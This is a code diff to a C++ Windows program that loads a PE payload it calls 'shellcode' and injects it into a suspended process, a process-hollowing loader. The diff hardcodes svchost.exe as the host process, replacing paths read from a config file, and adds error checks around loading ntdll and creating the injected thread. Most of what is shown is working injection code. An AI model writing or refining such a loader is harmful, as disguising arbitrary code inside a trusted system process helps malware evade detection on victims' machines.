@@ -10,38 +10,6 @@
 
 
 int main() {
-    if (!std::filesystem::exists("paths.txt")) {
-        std::cerr << "paths.txt not found in directory\n";
-        std::cin.get();
-        return 1;
-    }
-
-    std::ifstream inputFile("paths.txt");
-    std::string filename;
-    std::string injectPath;
-
-    if (std::getline(inputFile, filename)) {
-        if (std::getline(inputFile, injectPath)) {
-            ;
-        }
-        else {
-            std::cerr << "Fix paths.txt\nLine 1: Path to PE to run\nLine 2: Path to PE to rewrite\n";
-            std::cin.get();
-            return 1;
-        }
-    }
-    else {
-        std::cerr << "Fix paths.txt\nLine 1: Path to PE to run\nLine 2: Path to PE to rewrite\n";
-        std::cin.get();
-        return 1;
-    }
-
-    inputFile.close();
-
-    // if you wish to hardcode the shellcode, remove both of these, the stuff above and head to hdr/shellcode.h
-    std::streamsize size;
-    unsigned char* shellcode = getPEbytes(filename, size);
-
     PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)shellcode;
     PIMAGE_NT_HEADERS64 NtHeader = (PIMAGE_NT_HEADERS64)(shellcode + DosHeader->e_lfanew);
 
@@ -54,13 +22,17 @@ int main() {
     DWORD64 ImgBaseAddress;
 
     HMODULE ntDll = LoadLibraryA("ntdll.dll");
+    if (ntDll == nullptr) {
+        std::cerr << "Failed to load ntDll\n";
+        return 1;
+    }
     NTQUERYINFOPROC64 NtQueryInformationProcess = (NTQUERYINFOPROC64)GetProcAddress(ntDll, "NtQueryInformationProcess");
 
     if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
         return 1;
     }
 
-    if (!CreateProcess(injectPath.c_str(),
+    if (!CreateProcess("C:\\Windows\\System32\\svchost.exe",
         NULL, NULL, NULL, FALSE,
         CREATE_SUSPENDED,
         NULL, NULL, &si, &pi)) {
@@ -117,6 +89,10 @@ int main() {
         CREATE_SUSPENDED,
         NULL);
 
+    if (!NewThread) {
+        std::cerr << "Failed to create thread\n";
+        return 1;
+    }
 
     SuspendThread(pi.hThread);
     ResumeThread(NewThread);
